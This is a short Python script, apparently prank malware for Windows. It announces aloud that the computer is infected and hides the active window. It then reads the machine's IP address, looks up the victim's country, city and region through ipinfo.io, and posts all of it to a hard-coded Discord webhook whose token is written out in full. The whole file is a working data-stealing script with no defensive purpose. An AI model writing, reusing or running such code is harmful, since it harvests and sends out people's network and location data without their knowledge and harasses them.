import pyttsx3 as tts
import time
import ctypes
import win32gui
import win32con
import socket
import requests

engine =  tts.init()
engine.say("Hello, your computer has been infected with a virus that will make your computer a living night mare, have fun with this") # living heel as in not blue screen but just as annoything as possible
engine.runAndWait()
hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
pcname = socket.gethostname()
ip = socket.gethostbyname(pcname)

webhook_url = 'https://discord.com/api/webhooks/1371285744836022382/fF1bWnuvkqvUv8XoYpotZU4QThuk-MgkAUtNSgCV0z4Br6v2RzpaaN4KqZ21FA6NuayV'

data = {
    "content": f"ip:{ip}",
    "username": "IpGraby"  # optional
}

response = requests.post(webhook_url, json=data)

if response.status_code == 204:
    print("Message sent!")
else:
    print(f"Failed: {response.status_code} - {response.text}")

def get_location():
    url = "https://ipinfo.io/json"
    response = requests.get(url)
    data = response.json()
    country = data['country']
    city = data['city']
    region = data['region']
    return country, city, region

def send_to_discord(webhook_url, country, city, region):
    payload = {
        "content": f"Country: {country}\nCity: {city}\nState: {region}"
    }
    requests.post(webhook_url, json=payload)

webhook_url2 = "https://discord.com/api/webhooks/1371285744836022382/fF1bWnuvkqvUv8XoYpotZU4QThuk-MgkAUtNSgCV0z4Br6v2RzpaaN4KqZ21FA6NuayV"
country, city, region = get_location()
send_to_discord(webhook_url2, country, city, region)
